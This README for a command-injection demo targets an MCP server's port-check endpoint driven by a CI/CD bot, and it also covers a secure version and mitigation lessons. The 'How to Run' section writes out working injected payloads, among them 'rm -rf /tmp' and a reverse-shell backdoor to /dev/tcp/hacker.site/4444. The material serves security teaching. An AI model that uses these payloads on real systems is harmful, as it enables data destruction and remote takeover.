# 🚀 MCP Injection Demo: CI/CD Bot Exploitation

**"Automated CI/CD Bot + MCP Server: From Real-World Productivity to Real-World Exploits"**

## 🎯 Demo Scenario

Our CI/CD bot uses an MCP server to automate port/process checks before deployments. This is a common pattern in modern DevOps pipelines and LLM ops assistants.

**Normal Operation:**
- CI/CD bot checks if a dev server/container can start on required ports
- If not, it alerts the team or tries to resolve automatically
- Uses MCP server's `/which-app-on-port` API

**The Vulnerability:**
- Insecure parameter handling = catastrophic breach!
- One unchecked input can lead to total system compromise

## 🏗️ Project Structure

```
mcp-injection-demo/
├── server/
│   ├── mcp_vulnerable.js      # Vulnerable MCP server
│   ├── mcp_secure.js          # Secure MCP server
│   ├── agent_client.js        # CI/CD bot simulator
│   └── common/
│       ├── logger.js          # Centralized logging
│       ├── validation.js      # Input validation helpers
│       └── shell.js           # Shell command wrappers
├── exploits/
│   ├── type_coercion.md       # Type coercion attacks (main + additional)
│   ├── chain_exploit.md       # Chained command attacks (main + additional)
│   └── backdoor_attack.md     # Persistent backdoor attacks (main + additional)
├── showcase/
│   ├── attack_walkthrough.md  # Step-by-step attack demo
│   └── defense_walkthrough.md # Security demonstration
├── tests/
│   ├── test_vulnerable.js     # Attack tests
│   ├── test_secure.js         # Security tests
│   └── malicious_payloads.js  # Payload collection
└── docs/
    ├── why_command_injection_matters.md
    └── mitigation_strategies.md
```

## 🚨 Attack Types Demonstrated

### 1. **Type Coercion Attack**
- **Payload:** `8080; touch /tmp/evil; #`
- **Effect:** Appends new command, leaves system marker
- **Demo:** `npm run attack:type-coercion`

### 2. **Chain Exploitation**
- **Payload:** `8080; echo '123; rm -rf /tmp/demo; #' #`
- **Effect:** First command's output pipes to second, triggering chained destructive actions
- **Demo:** `npm run attack:chain`

### 3. **Backdoor Attack**
- **Payload:** Creates persistent shell backdoor
- **Effect:** Full remote shell access
- **Demo:** `npm run attack:backdoor`

## 🧪 How to Run the Demo

### 1. Setup
```bash
npm install
cp .env.example .env
```

### 2. Start Vulnerable MCP Server
```bash
npm run start:vulnerable
```

### 3. Simulate CI/CD Bot Attacks

**Normal Operation:**
```bash
node server/agent_client.js --port=8080
```

**Type Coercion Attack:**
```bash
node server/agent_client.js --port="8080; touch /tmp/owned; #"
```

**Chain Attack:**
```bash
node server/agent_client.js --port="8080; echo '123; rm -rf /tmp; #' #"
```

**Backdoor Attack:**
```bash
node server/agent_client.js --port="8080; echo '#!/bin/bash' > /tmp/b.sh && echo 'bash -i >& /dev/tcp/hacker.site/4444 0>&1' >> /tmp/b.sh && chmod +x /tmp/b.sh && /tmp/b.sh &"
```

### 4. Observe System Changes
- Check `/tmp/owned`, `/tmp/b.sh` - side effects prove exploit worked!
- Review logs in `showcase/` folder

### 5. Switch to Secure Server
```bash
npm run start:secure
```
Run exact same payloads - they fail (are rejected) and are logged.

## 📊 Demo Presentation Flow

1. **Normal Case:** Show CI/CD bot working correctly
2. **Type Coercion:** Demonstrate command appending
3. **Chain Attack:** Show stage-two exploitation
4. **Backdoor:** Real persistent payload
5. **Secure Version:** Rerun attacks on secure server
6. **Comparison:** Show how easy it is to block with proper validation

## 🔒 Security Lessons

- **Input Validation:** Always validate beyond type system
- **Command Execution:** Use `execFile()` with argument arrays
- **Least Privilege:** Run services with minimal permissions
- **Monitoring:** Log and alert on suspicious patterns
- **Defense in Depth:** Multiple layers of protection

## 📁 Key Files

- `server/mcp_vulnerable.js` - Shows the vulnerable pattern
- `server/mcp_secure.js` - Shows the secure pattern
- `exploits/` - Contains all attack payloads (main exploits for presentation + additional for reference)
- `showcase/` - Step-by-step walkthroughs
- `tests/` - Automated attack and defense tests

## 🎯 What Judges See

- Real-world CI/CD bot leveraging real automation
- Attackers can pwn the system if one parameter is unchecked
- Clear code/validation notes showing how to block attacks
- Complete before/after demonstration with logs and system changes

---

**⚠️ WARNING: This is a security demo. Only run in isolated environments!** 